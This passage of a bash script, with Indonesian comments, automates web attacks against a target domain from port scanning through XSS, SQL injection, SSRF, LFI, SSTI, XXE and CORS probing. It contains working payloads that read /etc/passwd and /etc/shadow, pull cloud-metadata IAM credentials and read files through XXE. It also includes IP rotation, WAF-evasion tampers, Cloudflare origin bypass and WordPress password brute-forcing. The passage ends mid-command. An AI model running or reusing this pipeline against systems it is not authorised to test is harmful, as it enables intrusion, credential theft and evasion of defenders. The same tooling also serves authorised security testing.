        tool_done "${OUTPUT_DIR}/recon/assetfinder.txt" || {
            command -v assetfinder &>/dev/null && \
                assetfinder --subs-only "$DOMAIN" \
                > "${OUTPUT_DIR}/recon/assetfinder.txt" 2>/dev/null &
        }
        wait
    }
    notify OK "Subfinder + Assetfinder done"

    tool_done "${OUTPUT_DIR}/recon/amass.txt" 50 || {
        check_tool "amass" && {
            notify INFO "Amass passive scan..."
            timeout $(get_timeout 600) amass enum -passive -d "$DOMAIN" -timeout $(get_timeout 10) \
                > "${OUTPUT_DIR}/recon/amass.txt" 2>/dev/null
            notify OK "Amass done"
        }
    }
    tool_done "${OUTPUT_DIR}/recon/fierce.txt" || {
        check_tool "fierce" && \
            timeout $(get_timeout 120) fierce --domain "$DOMAIN" \
            > "${OUTPUT_DIR}/recon/fierce.txt" 2>/dev/null && notify OK "Fierce done"
    }
    tool_done "${OUTPUT_DIR}/recon/dnsrecon.txt" || {
        check_tool "dnsrecon" && \
            timeout $(get_timeout 120) dnsrecon -d "$DOMAIN" -t std,brt,axfr \
            > "${OUTPUT_DIR}/recon/dnsrecon.txt" 2>/dev/null && notify OK "DNSRecon done"
    }

    cat "${OUTPUT_DIR}/recon/"*.txt 2>/dev/null | sort -u \
        > "${OUTPUT_DIR}/recon/all_subs.txt"

    tool_done "${OUTPUT_DIR}/recon/live_hosts.txt" 50 || {
        check_tool "httpx" && {
            cat "${OUTPUT_DIR}/recon/all_subs.txt" | \
                httpx -silent -status-code -title -tech-detect -threads $(get_threads 50) \
                -o "${OUTPUT_DIR}/recon/live_hosts.txt" 2>/dev/null
            notify OK "httpx live hosts -> recon/live_hosts.txt"
        }
    }
fi

# ── PHASE 3: PORT SCAN ──────────────────────────────────────────
update_turbo; show_time_status
should_skip 3 || separator "PHASE 3 -- PORT & SERVICE SCANNING"
if ! $PHASE_SKIPPED; then
    OPEN_PORTS=""
    if check_tool "masscan"; then
        tool_done "${OUTPUT_DIR}/ports/masscan_raw.txt" 20 && \
            OPEN_PORTS=$(grep "open" "${OUTPUT_DIR}/ports/masscan_raw.txt" 2>/dev/null | \
            awk '{print $4}' | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//') || {
            notify INFO "Masscan -- discovering open ports..."
            masscan "$IP" -p1-65535 --rate=10000 \
                -oG "${OUTPUT_DIR}/ports/masscan_raw.txt" 2>/dev/null
            OPEN_PORTS=$(grep "open" "${OUTPUT_DIR}/ports/masscan_raw.txt" 2>/dev/null | \
                awk '{print $4}' | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')
            notify OK "Masscan done -- open ports: ${OPEN_PORTS:-none}"
        }
    fi

    if check_tool "nmap"; then
        tool_done "${OUTPUT_DIR}/ports/nmap_full.nmap" 100 && \
            notify OK "Nmap full -- already exists, skipping" || {
            notify INFO "Nmap -- scanning open ports: ${OPEN_PORTS:-top200}..."
            if [[ -n "$OPEN_PORTS" ]]; then
                nmap -sV -sC -T4 -p "$OPEN_PORTS" \
                    --script="http-headers,http-title,http-methods,http-shellshock,\
http-backup-finder,http-default-accounts,ssl-heartbleed,ssl-enum-ciphers,vulners" \
                    -oA "${OUTPUT_DIR}/ports/nmap_full" "$DOMAIN" 2>/dev/null
            else
                nmap -sV -sC -T4 --top-ports 200 --open \
                    --script="http-headers,http-title,ssl-heartbleed,vulners" \
                    -oA "${OUTPUT_DIR}/ports/nmap_full" "$DOMAIN" 2>/dev/null
            fi
            notify OK "Nmap full scan -> ports/nmap_full.*"
        }

        tool_done "${OUTPUT_DIR}/ports/nmap_vuln.txt" 50 && \
            notify OK "Nmap vuln -- already exists, skipping" || {
            notify INFO "Nmap vuln scan..."
            nmap -sV -T4 --script vuln \
                -p "${OPEN_PORTS:-80,443,8080,8443}" \
                -oN "${OUTPUT_DIR}/ports/nmap_vuln.txt" "$DOMAIN" 2>/dev/null
            notify OK "Nmap vuln scan -> ports/nmap_vuln.txt"
        }
    fi

    tool_done "${OUTPUT_DIR}/ports/ssl_deep.txt" 100 && \
        notify OK "testssl -- already exists, skipping" || {
        check_tool "testssl.sh" && {
            notify INFO "testssl.sh SSL/TLS scan..."
            timeout $(get_timeout 600) testssl.sh --quiet --color 0 --nodns --vulnerable \
                "$TARGET_URL" > "${OUTPUT_DIR}/ports/ssl_deep.txt" 2>/dev/null
            notify OK "testssl.sh -> ports/ssl_deep.txt"
        }
    }
fi

# ── PHASE 4: FINGERPRINT + CF DETECT ────────────────────────────
update_turbo; show_time_status
should_skip 4 || separator "PHASE 4 -- FINGERPRINTING & WAF"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/recon/whatweb.txt" || {
        check_tool "whatweb" && \
            whatweb -v -a 3 "$TARGET_URL" \
            --open-timeout=5 --read-timeout=10 --max-threads=20 \
            > "${OUTPUT_DIR}/recon/whatweb.txt" 2>/dev/null && notify OK "WhatWeb done"
    }
    tool_done "${OUTPUT_DIR}/recon/waf.txt" || {
        check_tool "wafw00f" && \
            wafw00f -a "$TARGET_URL" \
            > "${OUTPUT_DIR}/recon/waf.txt" 2>/dev/null && notify OK "WAFW00F done"
    }

    # CF Detection
    CF_DETECTED=false
    if grep -qi "cloudflare" "${OUTPUT_DIR}/recon/waf.txt" 2>/dev/null; then
        CF_DETECTED=true
    else
        CF_CHECK=$(curl -sk -I --max-time 5 "$TARGET_URL" 2>/dev/null | grep -i "cf-ray\|cloudflare")
        [[ -n "$CF_CHECK" ]] && CF_DETECTED=true
    fi
    [[ "$CF_DETECTED" == "true" ]] && \
        notify WARN "CLOUDFLARE DETECTED -- CF bypass mode active" || \
        notify OK "No Cloudflare detected"

    # Cari IP asli kalau CF ada
    if [[ "$CF_DETECTED" == "true" ]]; then
        tool_done "${OUTPUT_DIR}/recon/cf_bypass.txt" || {
            {
                echo "=== CF BYPASS IP HUNT ==="
                curl -sk --max-time 10 \
                    "https://api.hackertarget.com/hostsearch/?q=${DOMAIN}" 2>/dev/null
                for sub in direct mail smtp ftp cpanel webmail admin dev staging; do
                    IP_SUB=$(dig +short "${sub}.${DOMAIN}" 2>/dev/null | head -1)
                    [[ -n "$IP_SUB" ]] && echo "[*] ${sub}.${DOMAIN} -> $IP_SUB"
                done
            } | tee "${OUTPUT_DIR}/recon/cf_bypass.txt"
            notify OK "CF bypass info -> recon/cf_bypass.txt"
        }
    fi

    tool_done "${OUTPUT_DIR}/headers/security_headers.txt" || {
        notify INFO "Checking security headers..."
        {
            H=$(curl -sk -I --max-time 10 "$TARGET_URL" 2>/dev/null)
            echo "=== SECURITY HEADERS === $(date)"
            for h in "Strict-Transport-Security" "Content-Security-Policy" \
                     "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" \
                     "Referrer-Policy" "Permissions-Policy" "X-Powered-By" "Server"; do
                echo "$H" | grep -qi "$h" && \
                    echo "[v] FOUND   : $h" || echo "[x] MISSING : $h"
            done
            echo ""; echo "=== RAW HEADERS ==="; echo "$H"
        } > "${OUTPUT_DIR}/headers/security_headers.txt"
        notify OK "Headers -> headers/security_headers.txt"
    }

    tool_done "${OUTPUT_DIR}/recon/sensitive_files.txt" || {
        notify INFO "Checking sensitive files..."
        for f in "/.env" "/.env.backup" "/config.php" "/wp-config.php" \
                 "/.git/config" "/phpinfo.php" "/backup.sql" "/robots.txt" \
                 "/swagger.json" "/openapi.json" "/graphql" "/.htaccess" \
                 "/package.json" "/docker-compose.yml"; do
            CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
                   --max-time 5 "${TARGET_URL}${f}" 2>/dev/null)
            [[ "$CODE" =~ ^(200|201|301|302|401|403)$ ]] && \
                echo "[!] ${CODE} -- ${TARGET_URL}${f}" \
                | tee -a "${OUTPUT_DIR}/recon/sensitive_files.txt"
        done
        notify OK "Sensitive files -> recon/sensitive_files.txt"
    }
fi

# ── PHASE 5: URL & PARAM DISCOVERY ──────────────────────────────
update_turbo; show_time_status
should_skip 5 || separator "PHASE 5 -- URL & PARAMETER DISCOVERY"
if ! $PHASE_SKIPPED; then
    # GAU + Waybackurls parallel (passive, selalu jalan)
    {
        tool_done "${OUTPUT_DIR}/params/gau.txt" 100 || {
            command -v gau &>/dev/null && \
                gau "$DOMAIN" --blacklist png,jpg,gif,css,woff,mp4 --threads 20 \
                > "${OUTPUT_DIR}/params/gau.txt" 2>/dev/null &
        }
        tool_done "${OUTPUT_DIR}/params/wayback.txt" 100 || {
            command -v waybackurls &>/dev/null && \
                waybackurls "$DOMAIN" \
                > "${OUTPUT_DIR}/params/wayback.txt" 2>/dev/null &
        }
        wait
    }
    notify OK "GAU + Waybackurls done"

    if [[ "$CF_DETECTED" == "true" ]]; then
        # CF MODE: Cariddi + Cloudscraper
        tool_done "${OUTPUT_DIR}/params/cariddi.txt" 100 || {
            check_tool "cariddi" && {
                notify INFO "CF Mode -- Cariddi crawling..."
                timeout $(get_timeout 300) cariddi -c 20 -t 10 -s "$TARGET_URL" \
                    > "${OUTPUT_DIR}/params/cariddi.txt" 2>/dev/null
                notify OK "Cariddi -> params/cariddi.txt"
            }
        }
        tool_done "${OUTPUT_DIR}/params/cloudscraper_urls.txt" 50 || {
            notify INFO "CF Mode -- Cloudscraper fetch..."
            python3 << PYEOF 2>/dev/null
import cloudscraper, os
try:
    scraper = cloudscraper.create_scraper(
        browser={"browser":"chrome","platform":"windows","mobile":False}
    )
    outdir = "${OUTPUT_DIR}/params"
    urls = []
    for f in ["cariddi.txt","gau.txt","wayback.txt"]:
        try:
            with open(f"{outdir}/{f}") as fh:
                for l in fh:
                    l = l.strip()
                    if l.startswith("http") and "?" in l and "${DOMAIN}" in l:
                        urls.append(l)
        except: pass
    urls = list(dict.fromkeys(urls))[:100]
    results = []
    for url in urls:
        try:
            r = scraper.get(url, timeout=8)
            if r.status_code == 200:
                results.append(url)
        except: pass
    with open(f"{outdir}/cloudscraper_urls.txt","w") as f:
        f.write("\n".join(results))
    print(f"[OK] Cloudscraper: {len(results)} URLs")
except ImportError:
    print("[-] pip install cloudscraper")
PYEOF
            notify OK "Cloudscraper -> params/cloudscraper_urls.txt"
        }
    else
        # NORMAL MODE: Katana + GoSpider + Hakrawler parallel
        {
            tool_done "${OUTPUT_DIR}/params/katana.txt" 50 || {
                command -v katana &>/dev/null && \
                    katana -u "$TARGET_URL" -d 3 -jc -silent \
                    -timeout 10 -c 30 -rl 150 \
                    > "${OUTPUT_DIR}/params/katana.txt" 2>/dev/null &
            }
            tool_done "${OUTPUT_DIR}/params/gospider.txt" 50 || {
                command -v gospider &>/dev/null && \
                    gospider -s "$TARGET_URL" -d 3 -c 30 -t 100 \
                    > "${OUTPUT_DIR}/params/gospider.txt" 2>/dev/null &
            }
            tool_done "${OUTPUT_DIR}/params/hakrawler.txt" 50 || {
                command -v hakrawler &>/dev/null && \
                    echo "$TARGET_URL" | hakrawler -d 4 -subs \
                    > "${OUTPUT_DIR}/params/hakrawler.txt" 2>/dev/null &
            }
            wait
        }
        notify OK "Katana + GoSpider + Hakrawler done (parallel)"
    fi

    tool_done "${OUTPUT_DIR}/params/paramspider.txt" || {
        check_tool "paramspider" && \
            paramspider -d "$DOMAIN" \
            -o "${OUTPUT_DIR}/params/paramspider.txt" 2>/dev/null && \
            notify OK "ParamSpider done"
    }

    if check_tool "arjun"; then
        tool_done "${OUTPUT_DIR}/params/arjun.txt" || {
            ARJUN_CMD="arjun -u \"$TARGET_URL\" --stable -oT \"${OUTPUT_DIR}/params/arjun.txt\""
            [[ -n "$PARAM_WL" && -f "$PARAM_WL" ]] && \
                ARJUN_CMD+=" -w \"$PARAM_WL\""
            eval "$ARJUN_CMD" 2>/dev/null && notify OK "Arjun done"
        }
    fi

    cat "${OUTPUT_DIR}/params/"*.txt 2>/dev/null | \
        grep -aE "^https?://" | grep "${DOMAIN}" | sort -u \
        > "${OUTPUT_DIR}/params/all_urls.txt"
    grep "?" "${OUTPUT_DIR}/params/all_urls.txt" | \
        grep -vE "(whatsapp|facebook|google|twitter|youtube|instagram)\.com" | sort -u \
        > "${OUTPUT_DIR}/params/urls_with_params.txt"
    URL_COUNT=$(wc -l < "${OUTPUT_DIR}/params/all_urls.txt" 2>/dev/null || echo 0)
    PARAM_COUNT=$(wc -l < "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null || echo 0)
    notify OK "URLs: ${URL_COUNT} | Params: ${PARAM_COUNT}"

    if check_tool "gf"; then
        for pat in xss sqli lfi ssrf rce redirect idor ssti; do
            OUT="${OUTPUT_DIR}/params/gf_${pat}.txt"
            tool_done "$OUT" || \
                cat "${OUTPUT_DIR}/params/all_urls.txt" | gf "$pat" 2>/dev/null \
                > "$OUT"
            COUNT=$(wc -l < "$OUT" 2>/dev/null || echo 0)
            notify INFO "GF ${pat}: ${COUNT} URLs"
        done
    fi
fi

# ── PHASE 6: DIRECTORY FUZZING ──────────────────────────────────
update_turbo; show_time_status
should_skip 6 || separator "PHASE 6 -- DIRECTORY & FILE FUZZING"
if ! $PHASE_SKIPPED; then
    # Smart wordlist setup (sesuai tech yang terdeteksi)
    separator "PHASE 0 -- SMART WORDLIST & TECH DETECTION"
    TECH_RESP=$(cat "${OUTPUT_DIR}/recon/whatweb.txt" 2>/dev/null)
    if echo "$TECH_RESP" | grep -qi "WordPress"; then
        WL="${SEC_WEB}/CMS/wordpress.fuzz.txt"
        [[ ! -f "$WL" ]] && WL="${SEC_WEB}/big.txt"
        notify OK "Tech: WordPress"
    elif echo "$TECH_RESP" | grep -qi "Joomla"; then
        WL="${SEC_WEB}/CMS/joomla.txt"
        [[ ! -f "$WL" ]] && WL="${SEC_WEB}/big.txt"
        notify OK "Tech: Joomla"
    elif echo "$TECH_RESP" | grep -qi "Laravel\|PHP"; then
        WL="${SEC_WEB}/PHP.fuzz.txt"
        [[ ! -f "$WL" ]] && WL="${SEC_WEB}/big.txt"
        notify OK "Tech: PHP/Laravel"
    else
        WL="${SEC_WEB}/big.txt"
        [[ ! -f "$WL" ]] && WL="${SEC_WEB}/common.txt"
        [[ ! -f "$WL" ]] && WL="/usr/share/wordlists/dirb/common.txt"
        notify OK "Tech: generic"
    fi

    FFUF_THREADS=${FFUF_THREADS:-80}
    FFUF_DELAY=""
    [[ "$CF_DETECTED" == "true" ]] && FFUF_THREADS=10 && FFUF_DELAY="-p 0.5"

    tool_done "${OUTPUT_DIR}/dirs/ffuf_dirs.json" 100 && \
        notify OK "FFUF dirs -- already exists, skipping" || {
        check_tool "ffuf" && {
            notify INFO "FFUF directory fuzzing..."
            ffuf -u "${TARGET_URL}/FUZZ" -w "$WL" \
                -mc 200,201,301,302,401,403 \
                -t $(get_threads $FFUF_THREADS) -timeout $(get_timeout 10) -ac -ic -s $FFUF_DELAY \
                -o "${OUTPUT_DIR}/dirs/ffuf_dirs.json" -of json 2>/dev/null
            notify INFO "FFUF file fuzzing..."
            ffuf -u "${TARGET_URL}/FUZZ" -w "${WL_RAFT:-$WL}" \
                -e .php,.asp,.aspx,.jsp,.js,.json,.txt,.bak,.zip,.sql,.env \
                -mc 200,201,301,302,401,403 \
                -t $FFUF_THREADS -ac -ic -s $FFUF_DELAY \
                -o "${OUTPUT_DIR}/dirs/ffuf_files.json" -of json 2>/dev/null
            notify OK "FFUF -> dirs/ffuf_*.json"
        }
    }

    tool_done "${OUTPUT_DIR}/dirs/gobuster.txt" 50 && \
        notify OK "Gobuster -- already exists, skipping" || {
        check_tool "gobuster" && \
            gobuster dir -u "$TARGET_URL" -w "$WL" \
            -x php,asp,aspx,js,txt,bak,zip,sql,env -t $(get_threads $FFUF_THREADS) -q --no-error \
            -o "${OUTPUT_DIR}/dirs/gobuster.txt" 2>/dev/null && \
            notify OK "Gobuster done"
    }

    tool_done "${OUTPUT_DIR}/dirs/feroxbuster.txt" 50 && \
        notify OK "Feroxbuster -- already exists, skipping" || {
        check_tool "feroxbuster" && \
            feroxbuster -u "$TARGET_URL" -w "$WL" \
            -x php,asp,aspx,js,bak,zip,sql,env --depth 4 --quiet --auto-bail \
            -o "${OUTPUT_DIR}/dirs/feroxbuster.txt" 2>/dev/null && \
            notify OK "Feroxbuster done"
    }

    tool_done "${OUTPUT_DIR}/dirs/nikto.txt" 100 && \
        notify OK "Nikto -- already exists, skipping" || {
        check_tool "nikto" && {
            notify INFO "Nikto..."
            nikto -h "$TARGET_URL" -Tuning 123457 \
                -o "${OUTPUT_DIR}/dirs/nikto.txt" -Format txt 2>/dev/null
            notify OK "Nikto -> dirs/nikto.txt"
        }
    }

    tool_done "${OUTPUT_DIR}/dirs/wpscan.txt" 100 && \
        notify OK "WPScanning -- already exists, skipping" || {
        check_tool "wpscan" && {
            WPSCAN_CMD="wpscan --url \"$TARGET_URL\" --enumerate vp,vt,u \
                $([ $TURBO_LEVEL -ge 2 ] && echo "--detection-mode passive" || echo "--detection-mode aggressive") --no-banner"
            [[ -n "$PASS_WL" && -f "$PASS_WL" ]] && \
                WPSCAN_CMD+=" --passwords \"$PASS_WL\" --usernames admin,administrator"
            eval "$WPSCAN_CMD" > "${OUTPUT_DIR}/dirs/wpscan.txt" 2>/dev/null
            notify OK "WPScanning done"
        }
    }
fi

# ── PHASE 7: XSS ────────────────────────────────────────────────
update_turbo; show_time_status
should_skip 7 || separator "PHASE 7 -- XSS HUNTING"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/xss/dalfox.txt" 50 && \
        notify OK "Dalfox -- already exists, skipping" || {
        if check_tool "dalfox"; then
            GF_XSS="${OUTPUT_DIR}/params/gf_xss.txt"
            DALFOX_INPUT="${OUTPUT_DIR}/params/dalfox_input.txt"
            if [[ -s "$GF_XSS" ]]; then
                grep "${DOMAIN}" "$GF_XSS" | head -$(get_max 100) > "$DALFOX_INPUT"
            else
                grep "${DOMAIN}" "${OUTPUT_DIR}/params/urls_with_params.txt" | \
                    head -$(get_max 100) > "$DALFOX_INPUT"
            fi
            notify INFO "Dalfox XSS scan..."
            DALFOX_CMD="px dalfox file \"$DALFOX_INPUT\" \
                --silence --no-spinner --worker $(get_threads 30) --timeout $(get_timeout 10) \
                --deep-domxss --mining-dom --mining-dict"
            [[ -n "$XSS_WL" && -f "$XSS_WL" ]] && \
                DALFOX_CMD+=" --custom-payload \"$XSS_WL\""
            [[ -n "$XSS_WL2" && -f "$XSS_WL2" ]] && \
                DALFOX_CMD+=" --custom-payload \"$XSS_WL2\""
            DALFOX_CMD+=" -o \"${OUTPUT_DIR}/xss/dalfox.txt\""
            eval "$DALFOX_CMD" 2>/dev/null
            XSS_CNT=$(grep -c "POC" "${OUTPUT_DIR}/xss/dalfox.txt" 2>/dev/null || echo 0)
            notify OK "Dalfox -> ${XSS_CNT} XSS"
        fi
    }

    tool_done "${OUTPUT_DIR}/xss/kxss.txt" 10 && \
        notify OK "KXSS -- already exists, skipping" || {
        check_tool "kxss" && \
            grep "${DOMAIN}" "${OUTPUT_DIR}/params/urls_with_params.txt" | \
            px kxss > "${OUTPUT_DIR}/xss/kxss.txt" 2>/dev/null && \
            notify OK "KXSS done"
    }

    tool_done "${OUTPUT_DIR}/xss/crlf.txt" 10 && \
        notify OK "CRLFuzz -- already exists, skipping" || {
        check_tool "crlfuzz" && \
            px crlfuzz -u "$TARGET_URL" -s \
            > "${OUTPUT_DIR}/xss/crlf.txt" 2>/dev/null && notify OK "CRLFuzz done"
    }
fi

# ── PHASE 8: SQL INJECTION ───────────────────────────────────────
update_turbo; show_time_status
should_skip 8 || separator "PHASE 8 -- SQL INJECTION"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/sqli" 100 && \
        notify OK "SQLMap -- already exists, skipping" || {
        if check_tool "sqlmap"; then
            SQLI_T="${OUTPUT_DIR}/params/gf_sqli.txt"
            [[ ! -s "$SQLI_T" ]] && SQLI_T="${OUTPUT_DIR}/params/urls_with_params.txt"
            grep -E "https?://(www\.)?${DOMAIN}/" "$SQLI_T" 2>/dev/null | \
                grep "?" | \
                grep -vE "(whatsapp|facebook|google|twitter|youtube|instagram)\.com" | \
                head -30 > /tmp/sqli_t.txt
            SQLI_COUNT=$(wc -l < /tmp/sqli_t.txt)
            notify INFO "SQLMap targets: ${SQLI_COUNT} URLs"
            if [[ $SQLI_COUNT -gt 0 ]]; then
                notify INFO "URLs to test:"
                head -5 /tmp/sqli_t.txt | while read u; do notify INFO "  -> $u"; done
                rotate_ip
                px sqlmap -m /tmp/sqli_t.txt \
                    --batch --no-cast --skip-waf --retries=1 --random-agent \
                    --level=${SQLMAP_LEVEL:-3} --risk=${SQLMAP_RISK:-2} --dbs --threads=5 \
                    --technique=BEUSTQ \
                    --tamper=space2comment,randomcase \
                    --timeout=15 \
                    --output-dir="${OUTPUT_DIR}/sqli" 2>/dev/null
                notify OK "SQLMap -> sqli/"
            else
                notify WARN "No valid URLs for SQLMap -- skipping"
            fi
        fi
    }
fi

# ── PHASE 9: SSRF ───────────────────────────────────────────────
update_turbo; show_time_status
should_skip 9 || separator "PHASE 9 -- SSRF"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/ssrf/ssrf_results.txt" 20 && \
        notify OK "SSRF -- already exists, skipping" || {
        SSRF_PARAMS=(url redirect uri path dest source src image img href file)
        SSRF_PAYLOADS=(
            "http://169.254.169.254/latest/meta-data/"
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            "file:///etc/passwd"
            "gopher://127.0.0.1:6379/_info"
            "dict://127.0.0.1:6379/info"
            "http://metadata.google.internal/computeMetadata/v1/"
            "http://100.100.100.200/latest/meta-data/"
        )
        [[ -n "$SSRF_WL" && -f "$SSRF_WL" ]] && \
            while IFS= read -r line; do
                [[ -n "$line" && "${line:0:1}" != "#" ]] && SSRF_PAYLOADS+=("$line")
            done < <(head -20 "$SSRF_WL" 2>/dev/null)
        {
            echo "=== SSRF SCAN === $(date)"
            REQN=0
            MAX_SSRF_PARAMS=$(get_max ${#SSRF_PARAMS[@]})
SSSRF_SLICE=("${SSRF_PARAMS[@]:0:$MAX_SSRF_PARAMS}")
for param in "${SSSRF_SLICE[@]}"; do
                for payload in "${SSRF_PAYLOADS[@]}"; do
                    REQN=$((REQN+1))
                    [[ $((REQN % 20)) -eq 0 ]] && rotate_ip
                    CODE=$(rq -o /dev/null -w "%{http_code}" --max-time 5 \
                           "${TARGET_URL}?${param}=${payload}" 2>/dev/null)
                    [[ "$CODE" =~ ^(200|301|302|307)$ ]] && \
                        echo "[!] SSRF POTENTIAL: ?${param}=${payload} -> $CODE"
                done
            done
        } > "${OUTPUT_DIR}/ssrf/ssrf_results.txt"
        SSRF_CNT=$(grep -c "POTENTIAL" "${OUTPUT_DIR}/ssrf/ssrf_results.txt" 2>/dev/null || echo 0)
        notify OK "SSRF -> ${SSRF_CNT} kandidat"
    }
fi

# ── PHASE 10: LFI ───────────────────────────────────────────────
update_turbo; show_time_status
should_skip 10 || separator "PHASE 10 -- LFI / PATH TRAVERSAL"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/lfi/lfi_results.txt" 10 && \
        notify OK "LFI -- already exists, skipping" || {
        LFI_PAYLOADS=(
            "../../../../etc/passwd"
            "../../../../etc/shadow"
            "....//....//....//etc/passwd"
            "..%252f..%252f..%252fetc%252fpasswd"
            "php://filter/convert.base64-encode/resource=/etc/passwd"
            "/proc/self/environ"
        )
        [[ -n "$LFI_WL" && -f "$LFI_WL" ]] && \
            while IFS= read -r line; do
                [[ -n "$line" && "${line:0:1}" != "#" ]] && LFI_PAYLOADS+=("$line")
            done < <(head -50 "$LFI_WL" 2>/dev/null)
        LFI_PARAMS=(file path page include load doc template view content read)
        {
            echo "=== LFI SCAN === $(date)"
            MAX_LFI=$(get_max ${#LFI_PARAMS[@]})
LFI_SLICE=("${LFI_PARAMS[@]:0:$MAX_LFI}")
for param in "${LFI_SLICE[@]}"; do
                for payload in "${LFI_PAYLOADS[@]}"; do
                    RESP=$(rq --max-time 5 "${TARGET_URL}?${param}=${payload}" 2>/dev/null)
                    echo "$RESP" | grep -qE "root:x:|uid=|gid=|/bin/bash" && \
                        echo "[!!!] LFI CONFIRMED: ?${param}=${payload}"
                done
            done
        } > "${OUTPUT_DIR}/lfi/lfi_results.txt"
        LFI_CNT=$(grep -c "CONFIRMED" "${OUTPUT_DIR}/lfi/lfi_results.txt" 2>/dev/null || echo 0)
        notify OK "LFI -> ${LFI_CNT} confirmed"
    }
fi

# ── PHASE 11: SSTI / XXE / RCE ──────────────────────────────────
update_turbo; show_time_status
should_skip 11 || separator "PHASE 11 -- SSTI / XXE / RCE"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/ssti/ssti_results.txt" 10 && \
        notify OK "SSTI -- already exists, skipping" || {
        SSTI_PAYLOADS=('{{7*7}}' '${7*7}' '#{7*7}' '*{7*7}' '<%= 7*7 %>')
        [[ -n "$SSTI_WL" && -f "$SSTI_WL" ]] && \
            while IFS= read -r line; do
                [[ -n "$line" && "${line:0:1}" != "#" ]] && SSTI_PAYLOADS+=("$line")
            done < <(head -20 "$SSTI_WL" 2>/dev/null)
        {
            echo "=== SSTI SCAN === $(date)"
            for param in name query search q msg input value template; do
                for payload in "${SSTI_PAYLOADS[@]}"; do
                    RESP=$(rq --max-time 5 -G \
                           --data-urlencode "${param}=${payload}" \
                           "$TARGET_URL" 2>/dev/null)
                    echo "$RESP" | grep -qE "49" && \
                        echo "[!!!] SSTI: param=${param} payload=${payload}"
                done
            done
        } > "${OUTPUT_DIR}/ssti/ssti_results.txt"

        check_tool "tplmap" && \
            tool_done "${OUTPUT_DIR}/ssti/tplmap.txt" || {
            px python3 "$(which tplmap)" -u "${TARGET_URL}?name=test" --level 5 \
                > "${OUTPUT_DIR}/ssti/tplmap.txt" 2>/dev/null
            notify OK "Tplmap done"
        }

        XXE_P='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
        XXE_R=$(rq -X POST -H "Content-Type: application/xml" -d "$XXE_P" \
                --max-time 10 "$TARGET_URL" 2>/dev/null)
        echo "$XXE_R" | grep -q "root:x:" && \
            echo "[!!!] XXE CONFIRMED" > "${OUTPUT_DIR}/xxe/xxe_confirmed.txt" || \
            echo "[-] XXE not confirmed" > "${OUTPUT_DIR}/xxe/xxe_results.txt"

        check_tool "commix" && \
            tool_done "${OUTPUT_DIR}/rce/commix.txt" || {
            px commix --url="$TARGET_URL" --batch --level=3 \
                > "${OUTPUT_DIR}/rce/commix.txt" 2>/dev/null
            notify OK "Commix done"
        }
    }
fi

# ── PHASE 12: CORS / SMUGGLING / JWT ────────────────────────────
update_turbo; show_time_status
should_skip 12 || separator "PHASE 12 -- CORS / HTTP SMUGGLING / JWT"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/cors/cors_results.txt" 10 && \
        notify OK "CORS -- already exists, skipping" || {
        {
            echo "=== CORS TEST === $(date)"
            for origin in "https://evil.com" "null" "https://attacker.com" "http://localhost"; do
                RESP=$(rq -H "Origin: $origin" -I "$TARGET_URL" 2>/dev/null)
                ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin")
                [[ -n "$ACAO" ]] && {
                    echo "[!] Origin: $origin -> $ACAO"
                    echo "$ACAO" | grep -qiE "evil|null|attacker" && \
                        echo "  [!!!] CORS MISCONFIGURATION!"
                }
            done
        } > "${OUTPUT_DIR}/cors/cors_results.txt"
        notify OK "CORS -> cors/cors_results.txt"
    }

    tool_done "${OUTPUT_DIR}/smuggling/smuggler.txt" 10 && \
        notify OK "Smuggler -- already exists, skipping" || {
        check_tool "smuggler" && \
            px python3 "$(which smuggler)" -u "$TARGET_URL" --level 3 \
            > "${OUTPUT_DIR}/smuggling/smuggler.txt" 2>/dev/null && \
            notify OK "Smuggler done"
    }

    tool_done "${OUTPUT_DIR}/jwt/jwt_found.txt" || {
        JWT_FOUND=$(rq "$TARGET_URL" 2>/dev/null | \
            grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
        [[ -n "$JWT_FOUND" ]] && \
            echo "[!] JWT: $JWT_FOUND" > "${OUTPUT_DIR}/jwt/jwt_found.txt" && \
            notify WARN "JWT found -> jwt/jwt_found.txt"
    }
fi

# ── PHASE 13: GRAPHQL & API ──────────────────────────────────────
update_turbo; show_time_status
should_skip 13 || separator "PHASE 13 -- GRAPHQL & API"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/graphql/graphql_results.txt" 10 && \
        notify OK "GraphQL -- already exists, skipping" || {
        {
            echo "=== GRAPHQL TEST === $(date)"
            for ep in /graphql /api/graphql /graphiql /v1/graphql /gql; do
                RESP=$(rq -X POST -H "Content-Type: application/json" \
                       -d '{"query":"{ __schema { types { name } } }"}' \
                       "${TARGET_URL}${ep}" 2>/dev/null)
                echo "$RESP" | grep -q "__schema" && \
                    echo "[!!!] GRAPHQL INTROSPECTION ENABLED: ${TARGET_URL}${ep}"
            done
        } > "${OUTPUT_DIR}/graphql/graphql_results.txt"
        notify OK "GraphQL -> graphql/graphql_results.txt"
    }
fi

# ── PHASE 14: NUCLEI ────────────────────────────────────────────
update_turbo; show_time_status
should_skip 14 || separator "PHASE 14 -- NUCLEI ULTRA SCAN"
if ! $PHASE_SKIPPED; then
    tool_done "${OUTPUT_DIR}/vulns/nuclei_main.txt" 100 && \
        notify OK "Nuclei -- already exists, skipping" || {
        if check_tool "nuclei"; then
            notify INFO "Nuclei full scan..."
            rotate_ip
            px nuclei -u "$TARGET_URL" \
                -t cves/ -t vulnerabilities/ -t exposures/ \
                -t misconfigurations/ -t default-logins/ \
                -t technologies/ -t takeovers/ \
                -severity info,low,medium,high,critical \
